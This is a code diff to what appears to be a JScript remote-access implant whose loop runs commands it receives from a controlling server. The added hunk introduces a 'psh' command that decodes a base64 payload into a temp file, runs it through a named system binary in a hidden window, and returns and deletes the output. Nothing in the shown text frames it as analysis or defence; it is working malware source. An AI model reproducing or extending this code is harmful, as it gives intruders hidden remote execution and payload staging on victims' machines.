@@ -133,6 +133,26 @@ while(true)
 		    retval = "[+] Spawn success..."
 	    }
 
+      //psh runs ... you know what
+      //duplicate code here and cmnd... :(
+      if(jsObject.cmnd.split(" ")[0] == "psh") {
+         fd = fso.CreateTextFile(temp + "\\" + id + ".txt")
+         msb = jsObject.cmnd.split(" ")[1]
+         msbdata = b64d(jsObject.cmnd.split(" ")[2])
+         fd.WriteLine(msbdata)
+         fd.close()
+         runner.Run(cs +" /q /c " + msb + " " + temp + "\\" + id + ".txt" + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
+		     if(fso.FileExists(temp + "\\__" + id + ".txt")) {
+		       fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
+	         retval = fd.ReadAll()
+		       fd.close()
+		       fso.DeleteFile(temp + "\\__" + id + ".txt", true)
+		     }
+		     else {
+		       retval = "[!] Error getting output"
+	       }
+      }
+
 	    //credit to nate and 0sum <3
 	    else {
         runner.Run(cs +" /q /c " + jsObject.cmnd + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
